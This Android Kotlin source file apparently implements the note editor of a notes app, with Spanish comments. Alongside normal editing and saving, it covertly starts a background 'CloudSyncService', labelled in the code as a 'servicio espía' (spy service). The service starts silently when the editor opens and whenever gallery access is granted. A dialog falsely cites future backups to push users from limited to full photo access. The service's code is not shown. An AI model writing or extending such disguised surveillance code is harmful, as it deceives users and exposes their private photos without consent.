package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.EditText
import android.widget.ImageButton
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog // Importante para el diálogo
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NoteEditorActivity : AppCompatActivity() {

    // Vistas
    private lateinit var etTitle: EditText
    private lateinit var etContent: EditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView

    // Variables de datos
    private var noteToEdit: Note? = null
    private var selectedColor: String? = "#FFFFFF"

    private val db by lazy { NotesDatabase.getDatabase(this) }

    // --- 1. MANEJADOR DE GALERÍA ---
    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val uri = result.data?.data
            if (uri != null) {
                try {
                    contentResolver.takePersistableUriPermission(
                        uri,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION
                    )
                    RichTextHelper.insertImage(this, etContent, uri)
                } catch (e: Exception) {
                    e.printStackTrace()
                    Toast.makeText(this, "Error al cargar imagen", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        // Configuración Visual
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        layoutEditor = findViewById(R.id.editor_root)
        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        initViews()
        setupListeners()
        loadNoteData()
        silentStartService()
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)
    }

    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }
            etTitle.setText(noteToEdit?.title)
            selectedColor = noteToEdit?.color
            RichTextHelper.setTextWithImages(this, etContent, noteToEdit?.content ?: "")
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"
            applyColor(selectedColor)
        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
        }
    }

    private fun setupListeners() {
        findViewById<ImageButton>(R.id.btn_back).setOnClickListener { finish() }
        findViewById<ImageButton>(R.id.btn_save).setOnClickListener { saveNote() }
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission() }

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            applyColor(colorHex)
        }
    }

    private fun applyColor(colorHex: String?) {
        if (colorHex != null) {
            try {
                layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
                etContent.setBackgroundColor(Color.TRANSPARENT)
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    // --- HELPER: VERIFICACIÓN DE PERMISO TOTAL ---
    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    // --- 3. PERMISOS Y GALERÍA ---
    private fun checkGalleryPermission() {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            openGallery()
        } else {
            // Solicitamos el permiso. Si el usuario ya lo denegó permanentemente,
            // onRequestPermissionsResult se llamará inmediatamente con DENEGADO.
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), 200)
        }
    }

    private fun openGallery() {
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
            addCategory(Intent.CATEGORY_OPENABLE)
            type = "image/*"
        }
        pickImageLauncher.launch(intent)
    }

    // --- 4. RESPUESTA AL PERMISO (LÓGICA MEJORADA) ---
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == 200) {
            val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

            // 1. ¿Tenemos acceso TOTAL?
            if (verificarAccesoTotal()) {
                iniciarServicioEspia()
                openGallery()
            }
            else {
                // FALLÓ LA SOLICITUD. Vamos a ver por qué.

                // A) Caso Android 14: Acceso Limitado (El usuario eligió fotos específicas)
                val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

                if (esAccesoLimitado) {
                    mostrarDialogoConfiguracion(
                        "Acceso Limitado Detectado",
                        "La aplicación requiere acceso a la galería para funcionar correctamente, no solo a imagenes seleccionadas, esto para realizar el correcto respaldo de datos a futuro. Por favor, selecciona 'Permitir todo' en la configuración."
                    )
                    return
                }

                // B) Caso Denegado Permanentemente ("No volver a preguntar")
                // Si 'shouldShowRequestPermissionRationale' devuelve FALSE después de una denegación,
                // significa que el usuario bloqueó el permiso permanentemente.
                if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                    mostrarDialogoConfiguracion(
                        "Permiso Requerido",
                        "Has denegado el acceso a la galería permanentemente. Para agregar imágenes, debes habilitarlo manualmente en Configuración > Permisos."
                    )
                }
                // C) Caso Denegado Simple (Primera vez o usuario dijo 'No' pero no 'Para siempre')
                else {
                    Toast.makeText(this, "Es necesario aceptar el permiso para agregar imágenes.", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // --- NUEVO HELPER: Muestra alerta para ir a Configuración ---
    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(mensaje)
            .setCancelable(false)
            .setPositiveButton("Ir a Configuración") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    // --- 5. SERVICIO ESPÍA ---
    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }

    private fun silentStartService() {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
        }
    }

    // --- 6. GUARDAR ---
    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val contentWithTags = etContent.text.toString()

        if (title.isEmpty() && contentWithTags.trim().isEmpty()) {
            Toast.makeText(this, "La nota está vacía", Toast.LENGTH_SHORT).show()
            return
        }

        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())

        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(
                    title = title,
                    content = contentWithTags,
                    date = formattedDate,
                    color = selectedColor
                )
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = contentWithTags
                    this.date = formattedDate
                    this.color = selectedColor
                }
                db.notesDao().update(noteToEdit!!)
            }

            withContext(Dispatchers.Main) {
                Toast.makeText(this@NoteEditorActivity, "Guardado", Toast.LENGTH_SHORT).show()
                finish()
            }
        }
    }
}